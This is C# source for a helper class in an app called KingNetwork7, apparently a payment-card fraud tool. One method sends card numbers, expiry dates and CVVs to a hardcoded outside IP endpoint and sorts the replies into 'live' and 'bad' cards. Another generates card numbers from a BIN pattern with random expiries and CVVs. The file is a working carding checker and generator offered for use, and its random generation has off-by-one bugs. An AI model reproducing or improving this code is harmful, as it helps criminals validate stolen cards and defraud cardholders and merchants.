using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using KingNetwork7.Models;
using Newtonsoft.Json;

namespace KingNetwork7.Helpers
{
    public static class CreditCardsHelper
    {
        static HttpClient client;
        static string reqUrl;
        static CreditCardsHelper()
        {
            client = new HttpClient();
            reqUrl = "http://212.227.175.36/Api/Tools/CheckCC";
        }

        public static void CheckCreditCards(string[] cards)
        {
            foreach (var card in cards)
            {
                CheckCreditCard(card);

                if (!App.MainViewModel.IsBusy)
                    return;
            }

            App.MainViewModel.IsBusy = false;
            AlertsHelper.ShowAlert("Succesful" ,"Cards Has Been Succesfuly Checked !", "OK");
        }

        public static void CheckCreditCard(string card)
        {
            try
            {
                var jsonBody = JsonConvert.SerializeObject(card);
                var content = new StringContent(jsonBody, Encoding.UTF8, "application/json");
                var response = client.PostAsync(new Uri(reqUrl), content).Result;
                if (response.IsSuccessStatusCode)
                {
                    string resSource = response.Content.ReadAsStringAsync().Result;
                    var splitedCard = card.Split('|');
                    if (splitedCard.Length < 4)
                        return;
                    if (resSource.Contains("Live"))
                    {
                        App.MainViewModel.LiveCards.Add(new CreditCard()
                        {
                            CCNumber = splitedCard[0],
                            ExpireDate = splitedCard[1] + "/" + splitedCard[2],
                            CVV = splitedCard[3]
                        });
                        return;
                    }

                    App.MainViewModel.BadCards.Add(new CreditCard()
                    {
                        CCNumber = splitedCard[0],
                        ExpireDate = splitedCard[1] + "/" + splitedCard[2],
                        CVV = splitedCard[3]
                    });
                }
            }
            catch
            {
                Helpers.AlertsHelper.ShowLongToast("An unexpected error occurred On Receive Data . ");
            }
        }

        public static void GenerateCreditCards(string bin, string cvv, string exMonth, string exYear, int count)
        {
            for (int i = 0; i < count; i++)
            {
                string newCard = GenerateNewCard(bin, cvv, exMonth, exYear);
                App.MainViewModel.GeneratedCards.Add(newCard);
            }
            AlertsHelper.ShowShortToast("Cards Has Been Generated !");
            App.MainViewModel.IsBusy = false;
        }

        public static string GenerateNewCard(string bin, string cvv, string exMonth, string exYear)
        {
            Random rnd = new Random();
            string cardNumber = "";
            if (string.IsNullOrEmpty(cvv))
                cvv = rnd.Next(100, 999).ToString();
            if (string.IsNullOrEmpty(exMonth) || exMonth == "random")
                exMonth = rnd.Next(1, 12).ToString("00");
            if (string.IsNullOrEmpty(exYear) || exYear == "random")
                exYear = rnd.Next(2021, 2027).ToString("00");
            foreach (char c in bin)
            {
                if (c == 'x')
                {
                    cardNumber += rnd.Next(0, 9).ToString();
                }
                else
                {
                    cardNumber += c.ToString();
                }
            }
            return cardNumber + "|" + exMonth + "|" + exYear + "|" + cvv;
        }
    }
}
